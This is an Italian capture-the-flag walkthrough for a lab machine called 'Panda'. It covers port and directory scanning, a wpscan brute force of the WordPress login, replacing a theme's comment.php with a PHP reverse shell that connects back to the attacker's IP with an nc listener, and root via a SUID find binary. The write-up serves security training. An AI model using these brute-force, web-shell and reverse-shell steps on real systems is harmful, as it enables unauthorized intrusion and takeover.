# PANDA

partiamo con lo scan delle porte

### ENUM

```bash
nmap panda.thm -sV -sC 
```

ottimo abbiamo la porta 80 aperta quindi una pagina web andiamo a controllarla

nulla di interessante solo un immagine

facciamo una ricerca delle directory

```bash
gobuster dir -u http://panda.thm/ -w /usr/share/wordlists/dirb/big.txt
```

interessante abbiamo la directory con  /Wordpress

guardiamo cosa c'è
```bash
http://panda.thm/wordpress
```
se c'è un pagina wordpress c'è un login quasi il 99% delle volte se non il 100%

controlliamo 
```bash
http://panda.thm/wordpress/wp-login.php
```

eccola 

facciamo uno scan insieme al brute force con WPSCAN
```bash
wpscan --url http://panda.thm/wordpress/wp-login.php --passwords /usr/share/wordlists/rockyou.txt
```

ecco qua il nostro utente po

accediamo alla pagina
## REVERSE SHELL
(spiegazione)
per chi avesse già esperienza con wordpress saltare questa spiegazione invece per chi non avesse mai visto questo CMS ci sono delle fasi che dovete imparare
wordpress lavora principalmente a pagine sotto pagine e temi molti di quest'ultimi sono vulnerabili perchè vanno ad aggiungere codice che potrebbe non essere controllato o che può avere insicurezze del codice 
quello che andrò a fare nei passaggi successivi userà un vulnerabilità del non controllo del codice.
(spiegazione)

su word press per andare a modificare i vari path del cms c'è un menu a tendina sulla destra. apritelo e andate nella sezione APPARENCE, una volta fatto click vi si dovrebbe aprire un sotto menu con varie opzioni.
andate a selezionare editor e successivamente vi si apre un menu sulla pagina (sulla destra), andate in questo menu e selezionate la sezione comment.php.
tramite questa sezione vi si apre un editor a schermo di questa pagina cancellate qualsiasi cosa ci sia scritta sopra, in modo da rendere la pagina vuota e aggiungete una reverse shell (vi consiglio https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
ricordate di cambiare nel php questi valori 
```bash
$ip = '127.0.0.1';  // CHANGE THIS 
$port = 1234;       // CHANGE THIS
```
mettete il vostro ip e la vostra porta dove ascolterete il traffico.

salvate questa pagina con l'apposito tasto.


ora avviamo l'ascolto sulla nostra macchina.
```bash
nc -lvnp porta scelta nel php
es. nc -lvnp 1234
```
ora tutto è pronto.

chiamiamo il nostro php tramite url (provate ad indovinare qual'è l'url) (hint: ricordatevi dove avete salvato il php)

ecco qua che si avvia la nostra shell con l'utente shifu facciamo privesc
## PRIVESC

```bash
find / -perm -4000 2>/dev/null
```

interessante abbiamo una vulnerabilità di tipo suid su find controllate GTFO.BINS per avere i privilegi di root




